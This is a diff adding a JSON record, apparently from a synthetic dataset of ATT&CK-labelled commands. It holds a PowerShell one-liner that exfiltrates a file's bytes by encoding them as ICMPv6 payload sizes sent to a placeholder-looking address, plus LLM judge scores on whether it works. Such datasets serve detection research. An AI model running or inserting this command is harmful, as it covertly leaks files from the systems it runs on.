@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Exfiltrates file bytes by encoding each byte into the ICMPv6 payload size using Test-Connection, leveraging ICMP/IPv6 as an alternative medium consistent with T1011.",
+  "rationale_steps": [
+    "Read the file as raw bytes.",
+    "Offset each byte and set it as the ICMP payload length (-BufferSize).",
+    "Send single ICMPv6 echos to a link-local address, suppressing output to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-b1a1a499",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command is well-formed and parseable, but it mixes Test-Connection parameters from different PowerShell versions (-ComputerName with -IPv6), likely causing an invalid parameter error on typical Windows PowerShell.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly automates exfiltration by encoding bytes into ICMPv6 payload sizes, aligning with the described technique, though execution may fail as written due to version-specific flags and dependence on a correct link-local scope ID.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T02:15:49.473784Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, proper variable assignment, correct piping, and valid parameter names for the Test-Connection cmdlet.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by reading a file's bytes and encoding each byte into ICMP packet sizes sent to an IPv6 address, creating a covert channel that aligns perfectly with the T1011 technique of using alternative protocols for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:15:52.783771Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, correct command separators, and valid flag formats for all cmdlets and methods used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by reading file bytes and encoding each into the ICMPv6 payload size via `Test-Connection -BufferSize`, representing a plausible automated exfiltration over an alternative protocol consistent with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:16:07.809508Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
